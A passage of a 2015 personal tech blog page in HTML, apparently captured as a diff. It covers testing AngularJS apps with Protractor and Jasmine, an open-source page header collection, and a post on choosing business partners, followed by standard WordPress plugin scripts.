+<p>Looking at the chart in Figure 1, since the features we build involve multiple parts of the system, testing at the <a href="https://en.wikipedia.org/wiki/Integration_testing">integration level </a>makes sense.  The Angular team has done a great job providing a tool just for that: <a href="http://www.protractortest.org">Protractor</a>.  It&#8217;s compatible with the Jasmine syntax, and uses a convenient element selection syntax for performing actions on target elements.  For example:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-linenumbers="false">var input = element(by.css('input'));
+input.sendKeys('123');
+expect(input.getAttribute('value')).toBe('Foo123');</pre>
+<p>Check out <a href="http://www.protractortest.org/#/api?view=ElementFinder">the docs</a> for more info.</p>
+<h4>Testing: Jasmine  👉 Unit-Testing</h4>
+<p>Here we unit test with the popular <a href="http://www.protractortest.org">Jasmine test framework</a>.  For each of the scenarios, now a series of internal modules become clear.  <strong>This was the aha moment.</strong>  <em>For each scenario, the internal requirements become clear.</em>  And just like the chart in Figure 1, I&#8217;m back to the Red-Green-Refactor cycle, defining and testing module behavior in the typical TDD fashion.</p>
+<p>The one thing that sticks out here with Angular is testing directives.  There are a couple of methods I&#8217;ve seen online recommended: using E2E for testing directives, or using the <a href="https://docs.angularjs.org/guide/unit-testing#testing-directives">internal angular directive compilation</a>.  Both are straightforward, however I was having trouble automating the file input through the directive compilation method because of browser security policies.  I&#8217;d rather not have to script launching browsers with special access policy flags, so I left those tests to Protractor.<b></b></p>
+<h4>Conclusion</h4>
+<p>So, in short, BDD with Angular is straightforward using Protractor and Jasmine for E2E and unit-testing.  By sticking to the chart in <a href="#figure-1">Figure 1</a>, building out scenarios, and sticking with givens/events/outcomes to outline our scenarios, we have a clear idea of how our app evolves.</p>
+<h4>Links</h4>
+<p>Jump over to Github and <a href="https://github.com/alexanderlperez/mailist">browse the code for Mailist</a>.  Then take a look at these links for the tools mentioned:</p>
+<ul>
+<li><a href="https://github.com/jasmine/jasmine">Jasmine</a></li>
+<li><a href="http://www.protractortest.org">Protractor</a></li>
+</ul>
+<p>For my favorite link on Angular testing, check out Year of Moo&#8217;s <a href="http://www.yearofmoo.com/2013/01/full-spectrum-testing-with-angularjs-and-karma.html">Full-Spectrum Testing with AngularJS and Karma</a>.  It&#8217;s centered around Mocha, Chai, and Karma as a testing framework, but the concepts for testing each part of an Angular app is broken down here.</p>
+<p>Let me know what you think on Twitter <a href="http://www.twitter.com/lintuxvi">@lintuxvi</a></p>
+	</div><!-- .entry-content -->
+
+	
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="http://devbrainhack.co/index.php/2015/11/02/recent-work-bdd-with-angularjs-and-protractor/" rel="bookmark"><time class="entry-date published" datetime="2015-11-02T19:11:38+00:00">November 2, 2015</time><time class="updated" datetime="2015-11-02T20:55:30+00:00">November 2, 2015</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="http://devbrainhack.co/index.php/category/uncategorized/" rel="category tag">Uncategorized</a></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="http://devbrainhack.co/index.php/tag/work/" rel="tag">work</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+<article id="post-36" class="post-36 post type-post status-publish format-standard hentry category-uncategorized tag-work">
+	
+	<header class="entry-header">
+		<h2 class="entry-title"><a href="http://devbrainhack.co/index.php/2015/10/07/recent-work-header-grab-bag/" rel="bookmark">Recent Work – Header Grab Bag</a></h2>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p><a href="http://devbrainhack.co/wp-content/uploads/2015/09/Screen-Shot-2015-09-10-at-8.08.40-PM-e1441930027258.png"><img class="aligncenter wp-image-27 size-full" src="http://devbrainhack.co/wp-content/uploads/2015/09/Screen-Shot-2015-09-10-at-8.08.40-PM-e1441930027258.png" alt="Screen Shot 2015-09-10 at 8.08.40 PM" width="1024" height="359" /></a></p>
+<p>Recently I put out a collection of page headers, all open sourced under the MIT license.  You can create your own styles by modifying a few variables in the included LESS source, or use one of the 11 included styles.</p>
+<p>Take a look at <a href="http://devbrainhack.co/projects/headergrabbag/">http://devbrainhack.co/projects/headergrabbag/ </a></p>
+<p>Tell me what you think on twitter <a href="http://twitter.com/lintuxvi">@lintuxvi</a>!</p>
+<p>✌️❤️🍻</p>
+	</div><!-- .entry-content -->
+
+	
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="http://devbrainhack.co/index.php/2015/10/07/recent-work-header-grab-bag/" rel="bookmark"><time class="entry-date published" datetime="2015-10-07T18:23:44+00:00">October 7, 2015</time><time class="updated" datetime="2015-11-02T21:49:35+00:00">November 2, 2015</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="http://devbrainhack.co/index.php/category/uncategorized/" rel="category tag">Uncategorized</a></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="http://devbrainhack.co/index.php/tag/work/" rel="tag">work</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+<article id="post-18" class="post-18 post type-post status-publish format-standard hentry category-business tag-business">
+	
+	<header class="entry-header">
+		<h2 class="entry-title"><a href="http://devbrainhack.co/index.php/2015/09/02/baking-partnerships/" rel="bookmark">Baking partnerships</a></h2>	</header><!-- .entry-header -->
+
+	<div class="entry-content">
+		<p><span style="font-size: 2em; font-style: bold;">I</span>&#8216;ve been wanting to write something for myself for a while now, and being a tech blog, I should inaugurate this one with an instance of writing blessed by tech canon: fail often and fail quick.  Figuratively, you can see it like playing a poker hand or snipping a wire defusing a bomb.  As far as consequences go, they can range from emotionally draining to traumatizing (in a sort of gradient between n&#8230;n+1).  But if we&#8217;re torturing analogies here, let&#8217;s talk about baking and partnerships.</p>
+<p>I&#8217;m mostly a coder, who dabbles in entrepreneurship, but since my passion lies in personal projects and friendships, I&#8217;ve run into a few situations where they come together.  Some of these Frankensteins have turned out well, and others not so much, but the biggest factor in determining that success has been in the partnership built.</p>
+<h4>Picking a partner: values and experience aren&#8217;t all sugar and spice</h4>
+<p>Picking a partner is a kind of baking.  You get the ingredients together, you lay them out in front of you, then crack, crack, crack, mix, mix, mix, whisk them all in a bowl and stick it in an oven.  Your project, the business, is like that oven.</p>
+<p>Cranking the oven up reveals the wonderful possibilities, and without it your cake is just a pan of half-rendered goop, in a state of ready decomposition.  By taking the elements and putting them to the test, all the constituent elements behave together as well as the mixed ingredients were picked and placed.</p>
+<p><a href="http://devbrainhack.co/wp-content/uploads/2015/09/herbs-and-spices.jpg"><img class="size-medium wp-image-20 aligncenter" src="http://devbrainhack.co/wp-content/uploads/2015/09/herbs-and-spices-300x210.jpg" alt="herbs-and-spices" width="300" height="210" /></a></p>
+<p>Except, <em>sometimes</em>, we as bakers are blind.  We as bakers mislabel our ingredients, or ignore the labels altogether.  What was salt is actually sugar and what is sugar is baking soda, and what is baking soda is Ajax scrubbing powder with bleach.  Yech, and call your local poison-control center immediately.</p>
+<p>People are the same.  You and I, we hold a few flavors for public consumption.  How we behave, the attitudes we project, our go-to methods for conflict resolution and problem-solving: we keep these as a sort of feature-set called upon as long as there&#8217;s clean, un-pressured energy to utilize before our fight-or-flight centers kick in.</p>
+<p>Take multiple people, add a potentially big payout, and now we&#8217;ve got some heat.  You&#8217;re going to run into situations when what you thought was a Beef-Wellington ends up being just a starter-log wrapped in yolk-glazed paper-mache.  Volatile, flammable.</p>
+<p>Some have ingredients rated for high temperatures, while others go up in flames pretty quickly.</p>
+<p>So, big note-to-self: <span style="text-decoration: underline;">put the time in beforehand.</span></p>
+<ol>
+<li>&#8216;Date&#8217; all potential partners, and be aware of the typical warning signs (ex. mismatched values, gut feelings, personal history)</li>
+<li>Make sure the vision is there.  No vision is like a train off the rails: crazy.</li>
+<li>Make sure there&#8217;s an end-game. Get confident about it, learn the possibilities and contingencies.</li>
+<li>Have an understanding of how each partner resolves uncertainty and conflict.  One person making decisions out of fear in a partnership is a symptom that real communication has broken down and planning is out the window.  That&#8217;s a recipe for burnout and disaster.</li>
+<li>Make sure negotiating financials isn&#8217;t akin to pulling teeth.  Someone who continually tries to negotiate you at every step is a sign that you&#8217;re not going to be working together long.</li>
+</ol>
+<p>If you&#8217;re going to be spending irretrievable time in your life with others, with the intentional goal of creating something to benefit everyone involved, make sure you all balance each other&#8217;s strengths and weaknesses in a lucid and explicit way, even at the worst of times.<strong><em>  And that&#8217;s not easy to achieve.  </em></strong>But putting in the legwork beforehand will be worth it in the end.</p>
+	</div><!-- .entry-content -->
+
+	
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="http://devbrainhack.co/index.php/2015/09/02/baking-partnerships/" rel="bookmark"><time class="entry-date published" datetime="2015-09-02T23:23:04+00:00">September 2, 2015</time><time class="updated" datetime="2015-11-30T18:29:27+00:00">November 30, 2015</time></a></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="http://devbrainhack.co/index.php/category/business/" rel="category tag">business</a></span><span class="tags-links"><span class="screen-reader-text">Tags </span><a href="http://devbrainhack.co/index.php/tag/business/" rel="tag">business</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+		</main><!-- .site-main -->
+	</div><!-- .content-area -->
+
+
+	</div><!-- .site-content -->
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<div class="site-info">
+						<a href="https://wordpress.org/">Proudly powered by WordPress</a>
+		</div><!-- .site-info -->
+	</footer><!-- .site-footer -->
+
+</div><!-- .site -->
+
+<script type='text/javascript' src='http://devbrainhack.co/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/devbrainhack.co\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://devbrainhack.co/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=4.2.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"View Cart","cart_url":"","is_cart":"","cart_redirect_after_add":"no"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='//devbrainhack.co/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=2.4.6'></script>
+<script type='text/javascript' src='//devbrainhack.co/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.70'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='//devbrainhack.co/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=2.4.6'></script>
+<script type='text/javascript' src='//devbrainhack.co/wp-content/plugins/woocommerce/assets/js/jquery-cookie/jquery.cookie.min.js?ver=1.4.1'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wc_cart_fragments_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","fragment_name":"wc_fragments"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='//devbrainhack.co/wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=2.4.6'></script>
+<script type='text/javascript' src='http://devbrainhack.co/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var screenReaderText = {"expand":"<span class=\"screen-reader-text\">expand child menu<\/span>","collapse":"<span class=\"screen-reader-text\">collapse child menu<\/span>"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://devbrainhack.co/wp-content/themes/twentyfifteen/js/functions.js?ver=20150330'></script>
+
+</body>
+</html>
